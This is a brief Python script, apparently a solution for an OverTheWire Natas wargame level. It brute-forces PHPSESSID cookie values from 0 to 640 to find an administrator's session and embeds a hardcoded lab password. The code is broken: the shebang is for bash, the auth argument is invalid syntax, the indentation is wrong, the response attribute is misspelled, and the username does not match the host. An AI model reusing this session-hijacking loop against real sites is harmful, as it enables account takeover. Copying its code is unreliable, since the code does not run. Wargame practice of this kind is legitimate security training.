#!/usr/bin/bash
from string import ascii_uppercase,ascii_lowercase,digits
import requests

user = "bandit18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

url = "http://%s.natas.labs.overthewire.org/index.php" %user

maxid = 640

_id = -1



session = requests.Session()
for id in range(0,maxid + 1):
	cookies_dict = {"PHPSESSID":str(id)} 
	request = session.post(url,data={"username":"admin","password":"admin"},auth{user,password},cookies=cookies_dict)
		if "You are an admin. The credentials" in request.Text:
			_id = 	id
			break;

